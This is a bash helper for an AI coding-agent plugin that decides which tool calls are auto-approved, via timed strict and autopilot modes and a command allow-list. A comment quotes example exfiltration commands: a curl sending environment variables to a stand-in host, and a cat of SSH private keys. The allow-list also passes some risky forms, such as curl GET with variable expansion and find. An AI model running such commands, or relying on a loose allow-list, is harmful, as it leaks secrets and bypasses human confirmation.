#!/usr/bin/env bash
# Claude Supercharger — Shared smart-approve verdict
# Single source of truth for "is this tool call known-safe to auto-approve?".
# Used by smart-approve.sh (to approve) AND notify-permission.sh (to SKIP the
# desktop notification for anything that gets auto-approved — otherwise the user
# is pinged for permissions they never actually have to act on). Keeping the
# decision in one place means the two hooks can never drift out of sync.
#
# Usage: smart_approve_verdict "$_INPUT"  → returns 0 if auto-approvable, else 1.
# Reads only stdin JSON fields; no side effects.

# Shared critical-infra matcher — same source of truth as critical-infra-guard.sh,
# so autopilot's auto-approve can never swallow a confirm the guard just forced.
# shellcheck source=hooks/lib-critical-infra.sh
. "${BASH_SOURCE[0]%/*}/lib-critical-infra.sh"

smart_approve_verdict() {
  local input="$1"
  local tool_name project_dir file_path abs_path command agent_id

  # Time-boxed modes, evaluated before any allow-list — tighten beats loosen:
  #   /sc-strict    → auto-approve NOTHING (return 1): every call falls through to the
  #                   normal permission prompt. Checked FIRST so it overrides autopilot.
  #   /sc-autopilot → auto-approve EVERYTHING (return 0): no prompts.
  # (/sc-readonly tightens separately, as a PreToolUse deny, and beats both there.)
  # The PreToolUse safety hooks run independently and still block dangerous calls
  # regardless of mode. Each mode is time-boxed with per-request expiry (no timer),
  # per-session (…-<session-id>) or global. Session id comes from the request (matches
  # the writers' CLAUDE_CODE_SESSION_ID); same SUPERCHARGER_STATE the writers use.
  local _md_state _md_sid _md_now _md_f _md_until
  _md_state="${SUPERCHARGER_STATE:-${CLAUDE_PLUGIN_DATA:-$HOME/.claude/supercharger}}"
  _md_sid=$(printf '%s\n' "$input" | jq -r '.session_id // empty' 2>/dev/null || true)
  _md_now=$(date +%s 2>/dev/null || echo 0)
  # Strict first — must override autopilot.
  for _md_f in "$_md_state/scope/.strict-until" ${_md_sid:+"$_md_state/scope/.strict-until-$_md_sid"}; do
    [ -f "$_md_f" ] || continue
    _md_until=$(cat "$_md_f" 2>/dev/null || echo 0)
    if printf '%s' "$_md_until" | grep -qE '^[0-9]+$' && [ "$_md_until" -gt "$_md_now" ]; then
      return 1
    fi
  done
  # Critical-infra edits (CI/CD, container, migrations, auth) are never auto-approved —
  # not even under autopilot. critical-infra-guard emits permissionDecision "ask"; this
  # return 1 (placed BEFORE the autopilot loop so autopilot's return 0 can't win first)
  # keeps that mandatory confirm from being swallowed. Tighten beats loosen.
  local _ci_tool _ci_path
  _ci_tool=$(printf '%s\n' "$input" | jq -r '.tool_name // empty' 2>/dev/null || true)
  case "$_ci_tool" in
    Write|Edit|MultiEdit|NotebookEdit)
      _ci_path=$(printf '%s\n' "$input" | jq -r '.tool_input.file_path // .tool_input.notebook_path // empty' 2>/dev/null || true)
      if [ -n "$_ci_path" ] && is_critical_infra_path "$_ci_path" >/dev/null 2>&1; then
        return 1
      fi
      ;;
  esac

  # Autopilot next.
  for _md_f in "$_md_state/scope/.autopilot-until" ${_md_sid:+"$_md_state/scope/.autopilot-until-$_md_sid"}; do
    [ -f "$_md_f" ] || continue
    _md_until=$(cat "$_md_f" 2>/dev/null || echo 0)
    if printf '%s' "$_md_until" | grep -qE '^[0-9]+$' && [ "$_md_until" -gt "$_md_now" ]; then
      return 0
    fi
  done

  tool_name=$(printf '%s\n' "$input" | jq -r '.tool_name // empty' 2>/dev/null || true)
  [ -z "$tool_name" ] && return 1

  project_dir=$(printf '%s\n' "$input" | jq -r '.cwd // .workspace.current_dir // empty' 2>/dev/null || true)
  [ -z "$project_dir" ] && project_dir="$PWD"
  agent_id=$(printf '%s\n' "$input" | jq -r '.agent_id // empty' 2>/dev/null || true)

  # Always-safe read-only tools
  case "$tool_name" in
    Read|Glob|Grep|LS|ls) return 0 ;;
  esac

  # Write/Edit inside the project directory
  if [ "$tool_name" = "Write" ] || [ "$tool_name" = "Edit" ] || [ "$tool_name" = "MultiEdit" ]; then
    file_path=$(printf '%s\n' "$input" | jq -r '.tool_input.file_path // empty' 2>/dev/null || true)
    if [ -n "$file_path" ] && [ -n "$project_dir" ]; then
      case "$file_path" in
        /*) abs_path="$file_path" ;;
        *)  abs_path="${project_dir}/${file_path}" ;;
      esac
      case "$abs_path" in
        "${project_dir}"/*) return 0 ;;
      esac
    fi
    return 1
  fi

  # Bash commands
  if [ "$tool_name" = "Bash" ]; then
    command=$(printf '%s\n' "$input" | jq -r '.tool_input.command // empty' 2>/dev/null || true)
    if [ -z "$command" ]; then
      command=$(printf '%s\n' "$input" | python3 -c "import sys,json; print(json.load(sys.stdin).get('tool_input',{}).get('command',''))" 2>/dev/null || echo "")
    fi
    [ -z "$command" ] && return 1

    # Never auto-approve subagent-originated Bash (delegating a task must not
    # implicitly grant open shell access).
    [ -n "$agent_id" ] && return 1

    # v2.8.10: never auto-approve a command containing command substitution.
    # The static allow-list patterns below match on the OUTER command shape
    # (`^curl`, `^cat`, ...) and can't reason about what a `$(...)` / backtick
    # expands to — e.g. `curl "https://x/?d=$(env)"` (GET, exfil) or
    # `cat $(find / -name id_rsa)` would otherwise be auto-approved, skipping the
    # user's manual confirmation. Defer these to the user / CC's classifier.
    # (${VAR} plain expansion is fine — only $(...) and backticks are gated.)
    case "$command" in
      *'$('*|*'`'*) return 1 ;;
    esac

    # --help / --version
    printf '%s\n' "$command" | grep -qE '(^|[[:space:]])--(help|version)([[:space:]]|$)' && return 0
    # Read-only shell commands
    printf '%s\n' "$command" | grep -qE '^[[:space:]]*(ls|pwd|cat|head|tail|printf|which|type|grep|find|rg|wc|sort|uniq|diff|file|stat|env|printenv)([[:space:]]|$)' && return 0
    # Read-only git subcommands
    printf '%s\n' "$command" | grep -qE '^[[:space:]]*git[[:space:]]+(status|log|diff|branch|show|remote|tag|stash list|rev-parse|describe)([[:space:]]|$)' && return 0
    # command -v
    printf '%s\n' "$command" | grep -qE '^[[:space:]]*command[[:space:]]+-v[[:space:]]' && return 0
    # Test runners
    printf '%s\n' "$command" | grep -qE '^[[:space:]]*(npm|yarn|pnpm)[[:space:]]+test([[:space:]]|$)|^[[:space:]]*(cargo|go)[[:space:]]+test([[:space:]]|$)|^[[:space:]]*pytest([[:space:]]|$)|^[[:space:]]*vitest([[:space:]]|$)|^[[:space:]]*jest([[:space:]]|$)' && return 0
    # Package manager run/build/dev commands
    printf '%s\n' "$command" | grep -qE '^[[:space:]]*(npm|yarn|pnpm|bun)[[:space:]]+(run|build|dev|start|lint|format|typecheck|type-check)([[:space:]]|$)' && return 0
    # Node/Python/Ruby running scripts — but NOT inline-eval forms
    if printf '%s\n' "$command" | grep -qE '^[[:space:]]*(node|python3?|ruby|tsx|ts-node)[[:space:]]' \
       && ! printf '%s\n' "$command" | grep -qE '(^|[[:space:]])(-e|-c|-p|--eval|--print)([[:space:]]|=|$)'; then
      return 0
    fi
    # curl — GET only
    if printf '%s\n' "$command" | grep -qE '^[[:space:]]*curl[[:space:]]'; then
      if ! printf '%s\n' "$command" | grep -qiE '(-X[[:space:]]*(POST|PUT|DELETE|PATCH)|--request[[:space:]]*(POST|PUT|DELETE|PATCH)|-d[[:space:]]|--data[[:space:]]|--data-raw[[:space:]]|--data-binary[[:space:]])'; then
        return 0
      fi
    fi
    # Build tools
    printf '%s\n' "$command" | grep -qE '^[[:space:]]*(make|cargo build|go build|tsc|gcc|g\+\+|rustc|javac)([[:space:]]|$)' && return 0

    return 1
  fi

  return 1
}
